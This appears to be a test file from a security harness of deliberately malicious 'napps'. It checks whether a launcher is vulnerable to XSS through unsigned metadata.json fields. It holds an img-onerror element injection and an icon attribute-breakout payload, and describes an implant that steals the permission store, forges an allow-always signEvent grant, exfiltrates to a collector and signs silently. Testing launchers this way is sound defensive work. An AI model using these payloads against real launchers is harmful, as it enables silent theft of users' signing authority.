// evil-02 — launcher XSS (tier 0). NAPP.md §Local metadata: metadata.json is
// the napp's self-description — local and uploaded napps both ship it, and it
// is UNSIGNED, attacker-controlled bytes that the launcher interpolates into
// its own origin's DOM (app cards, permission prompts, handler pickers,
// window titles). A launcher that renders any field as HTML hands the napp
// script execution at the launcher origin: the whole trust model inverts —
// permission grants, the shared store, every bridge authority.
//
// The payloads live IN this napp's metadata.json (description = element
// injection, icon = attribute injection). Each is an inert callback implant:
// it reports 'fired' to every iframe and parks a message listener. In demo
// mode that is ALL it does (no writes, no network). In VERY EVIL mode the
// rows arm the parked implant: it steals the permission-decision store and the
// harness canaries, FORGES an allow-always decision for this napp's
// signEvent, exfiltrates, and the silent-sign row proves the forgery governs.
window.__EVIL_KIT__ = [
  {
    label: 'metadata.json description — element injection',
    note: 'NAPP.md never promises metadata fields are safe HTML. The launcher\'s card list, permission prompt and handler picker all put title/description into the launcher DOM. innerHTML there = script execution at the launcher origin.',
    data: { title: 'Note editor', description: 'Note editor with tags and search.<img src=x onerror="/* implant */">' },
  },
  {
    label: 'metadata.json icon — attribute injection',
    note: 'icon is "Icon URL or path" — interpolated into an <img src="…"> by lazy launchers. Breaking out of the attribute executes the same implant without any element injection.',
    data: { icon: 'x" onerror="/* implant */" data-y="' },
  },
  {
    label: 'the forged decision the implant writes',
    note: 'What launcher-origin XSS buys: the permission store is the launcher\'s own localStorage. An allow-always for signEvent turns every later gated call into silent signing — no prompt ever again.',
    data: { '__harness_decisions__': { 'evil-02-launcher-xss|signEvent': 'allow' } },
  },
];

// Every 'fired'/'done:'/'err:' callback the implant sends lands here.
const xssEvents = [];
window.addEventListener('message', (e) => {
  const d = e.data && e.data.__evil02xss;
  if (!d || typeof d.vector !== 'string') return;
  xssEvents.push({ vector: d.vector, msg: String(d.msg || ''), at: Date.now() });
});
function firesFor(vector) { return xssEvents.some(x => x.vector === vector); }
function implantReplies() { return xssEvents.filter(x => /^done:|^err:/.test(x.msg)); }
function waitForXss(pred, ms) {
  return new Promise((resolve) => {
    const t0 = Date.now();
    const iv = setInterval(() => {
      if (pred()) { clearInterval(iv); resolve(true); }
      else if (Date.now() - t0 > ms) { clearInterval(iv); resolve(false); }
    }, 150);
  });
}
function waitForImplantReply(ms) {
  return waitForXss(() => implantReplies().length > 0, ms)
    .then((ok) => (ok ? implantReplies()[implantReplies().length - 1] : null));
}

const ATTACKS = [
  {
    id: 'card-html',
    name: 'metadata rendered as HTML',
    target: 'NAPP.md §Local metadata — unsigned metadata.json interpolated into the launcher\'s own DOM',
    severity: 'critical',
    harm: 'metadata.json is attacker bytes. Rendered as HTML in the launcher origin it executes script THERE: read and forge permission grants, drive the shared store, script every napp frame, deface the launcher. The bridge\'s whole permission model becomes decoration.',
    evilBrief: 'Arms the callback implant already parked at the launcher origin: it reads the permission-decision store and the launcher canaries, FORGES an allow-always signEvent decision for this napp, POSTs everything to the collector, and reports back. (In demo mode the implant is inert: it only called back to prove execution.)',
    async demo() {
      const fired = await waitForXss(() => firesFor('description'), 3500);
      if (fired) {
        return armed(
          'payload EXECUTED at the launcher origin — my metadata.json description ran as script there and called back to me. ' +
          'The implant is parked (inert in demo mode); on EXECUTE it takes the permission store.'
        );
      }
      return blocked(
        'no callback: the launcher rendered metadata as text, or its CSP held inline handlers — the description payload never executed'
      );
    },
    async evil() {
      postParent({ __evil02arm: { collector: state.collector } });
      const reply = await waitForImplantReply(9000);
      if (!reply) return { error: 'implant never answered the arm message (not parked?)' };
      return { implantReply: reply.msg.slice(0, 320), vector: reply.vector };
    },
  },
  {
    id: 'icon-attr',
    name: 'icon attribute injection',
    target: 'metadata.json icon: "Icon URL or path" — interpolated into <img src="…">',
    severity: 'high',
    harm: 'Even a launcher that escapes description strings often builds icon tags by string concatenation. Breaking out of the src attribute executes the same implant — the icon field needs the same treatment as every other metadata field.',
    evilBrief: 'Same as the description row: the icon-vector implant reports and, armed, steals + forges + exfiltrates from the launcher origin.',
    async demo() {
      const fired = await waitForXss(() => firesFor('icon'), 3500);
      if (fired) {
        return armed('icon attribute injection EXECUTED at the launcher origin (vector: icon) — the payload broke out of the src attribute and called back');
      }
      return blocked('no callback from the icon vector — rendered safely or held');
    },
    async evil() {
      postParent({ __evil02arm: { collector: state.collector } });
      const reply = await waitForImplantReply(9000);
      return { implantReply: reply ? reply.msg.slice(0, 320) : 'no reply (already armed by the first row — see its evidence)' };
    },
  },
  {
    id: 'silent-sign',
    name: 'forged grant → silent signing',
    target: 'the permission store is launcher-origin localStorage',
    severity: 'critical',
    harm: 'Launcher-origin XSS is not just reading: the permission-decision store is writable. One forged allow-always and every later gated bridge call — signing, publishing — runs with no prompt, forever. The user never sees another dialog.',
    evilBrief: 'After the implant forges the allow-always signEvent decision, this row calls window.nostr.signEvent through the bridge and signs a marker note with NO prompt. The launcher\'s prompt knob is still on "prompt" — the forged grant governs anyway.',
    async demo() {
      if (firesFor('description') || firesFor('icon')) {
        return armed(
          'the implant is parked at the launcher origin (see the render rows) — on EXECUTE it forges an allow-always for my signEvent, and this row signs with NO prompt, under the "prompt" policy'
        );
      }
      return blocked('no implant parked at the launcher — nothing to forge grants with');
    },
    async evil() {
      const r = await bridgeRpc('signEvent', {
        kind: 1,
        tags: [['alt', 'evil-02 forged-grant silent signing proof'], ['client', 'evil-napps']],
        content: 'evil-02: signed under a FORGED allow-always decision — no prompt was shown',
        created_at: Math.floor(Date.now() / 1000),
      });
      const res = r && typeof r === 'object' ? (r.result ?? r.error ?? r) : r;
      const sig = res && typeof res === 'object' ? res.sig : null;
      return {
        signResult: res && typeof res === 'object' ? { id: res.id, sig: sig ? mask(sig, 12) : sig } : res,
        promptFree: typeof sig === 'string' && sig.length > 0,
      };
    },
  },
];
